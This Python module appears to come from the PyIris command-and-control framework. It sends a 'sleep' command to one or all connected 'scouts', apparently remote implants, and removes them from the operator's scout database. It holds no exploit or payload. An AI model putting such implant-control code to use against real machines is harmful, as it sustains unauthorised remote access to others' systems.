# API
# done
import socket
import pyiris_api.library.modules.send_all as send_all
import pyiris_api.library.modules.recv_all as recv_all


def main(self, scout_id, sleep_dur):
    try:
        if scout_id == 'all':
            warning = False
            for i in list(self.config.scout_database.keys()):
                try:
                    self.log.inf('Sleeping scout of ID : ' + i)
                    send_all.main(self.config.scout_database[i]["conn_object"], 'sleep ' + sleep_dur)
                    data = recv_all.main(self.config.scout_database[i]["conn_object"])
                    self.log.blank(data)
                    try:
                        del (self.config.scout_database[i])
                        self.config.change = True
                    except IndexError:
                        self.log.err('Scout does not exist in database!')
                except socket.error:
                    try:
                        self.log.war('Scout is dead, removing from database...')
                        warning = True
                        del (self.config.scout_database[i])
                        self.config.change = True
                    except IndexError:
                        self.log.err('Scout does not exist in database!')
            if warning:
                return {"status": "warning", "message": "Successfully slept scouts. 1 or more scouts were already dead", "data": {"scout_database": self.config.scout_database}}
            else:
                return {"status": "ok", "message": "Successfully slept scouts",  "data": {"scout_database": self.config.scout_database}}
        else:
            if sleep_dur == "" or sleep_dur is None:
                self.log.war("No sleep duration found")
                sleep_dur = 10
            if type(sleep_dur) != int:
                try:
                    sleep_dur = int(sleep_dur)
                except ValueError:
                    self.log.war("Non-integer sleep duration found")
                    sleep_dur = 10
            if sleep_dur < 0:
                self.log.war("Negative sleep duration found")
                sleep_dur = 10
            sleep_dur = str(sleep_dur)
            self.log.inf(f"Sleep duration of {sleep_dur}s used")
            self.log.inf('Sleeping scout of ID : ' + str(scout_id))
            send_all.main(self.config.scout_database[scout_id]["conn_object"], 'sleep ' + sleep_dur)
            data = recv_all.main(self.config.scout_database[scout_id]["conn_object"])
            self.log.blank(data)
            try:
                del (self.config.scout_database[scout_id])
                self.config.change = True
            except IndexError:
                self.log.err('Scout does not exist in database!')
            return {"status": "ok", "message": f"Successfully slept scout for {sleep_dur}s", "data": {"scout_database": self.config.scout_database}}
    except KeyError:
        self.log.err('Please enter a valid scout ID')
        return {"status": "error", "message": "Please enter a valid scout ID", "data": None}
    except IndexError:
        self.log.err('Please enter valid arguments')
        return {"status": "error", "message": "Please enter valid arguments", "data": None}
    except socket.error:
        try:
            self.log.war('Scout is dead, removing from database...')
            del (self.config.scout_database[scout_id])
            self.config.change = True
        except IndexError:
            self.log.err('Scout does not exist in database!')
        return {"status": "warning", "message": "Scout is already dead", "data": {"scout_database": self.config.scout_database}}